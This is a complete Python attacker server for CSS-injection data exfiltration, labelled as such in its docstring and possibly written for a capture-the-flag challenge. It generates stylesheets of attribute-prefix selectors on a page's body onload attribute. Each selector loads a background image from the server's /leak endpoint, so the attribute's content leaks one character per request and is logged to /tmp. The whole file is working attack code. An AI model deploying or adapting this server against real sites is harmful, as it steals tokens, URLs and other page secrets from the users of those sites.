#!/usr/bin/env python3
"""Attacker server for CSS exfil."""
import http.server
import socketserver
import urllib.parse
import os
import string

PREFIX_FILE = '/tmp/exfil_prefix.txt'
LOG_FILE = '/tmp/exfil_log.txt'

CHARS = string.printable.replace('\n','').replace('\r','').replace('\t','').replace('\x0b','').replace('\x0c','')

def get_prefix():
    if os.path.exists(PREFIX_FILE):
        return open(PREFIX_FILE).read()
    return "fetch('"

def make_css(prefix, base_url):
    rules = []
    for c in CHARS:
        full = prefix + c
        # Escape for CSS double-quoted string
        escaped = full.replace("\\", "\\\\").replace('"', '\\"')
        url_char = urllib.parse.quote(c, safe='')
        rule = f'body[onload^="{escaped}"] {{ background: url("{base_url}/leak?c={url_char}"); }}'
        rules.append(rule)
    return "\n".join(rules)

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass
    def do_GET(self):
        if self.path.startswith('/leak'):
            qs = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(qs)
            char = params.get('c', [''])[0]
            with open(LOG_FILE, 'a') as f:
                f.write(f"LEAK: {char!r}\n")
            print(f"LEAKED: {char!r}", flush=True)
            self.send_response(204)
            self.end_headers()
        elif self.path == '/style.css':
            prefix = get_prefix()
            host = self.headers.get('Host', 'localhost')
            base = f"https://{host}"
            css = make_css(prefix, base)
            self.send_response(200)
            self.send_header('Content-Type', 'text/css')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(css.encode())
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

PORT = 9000
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving on port {PORT}", flush=True)
    httpd.serve_forever()
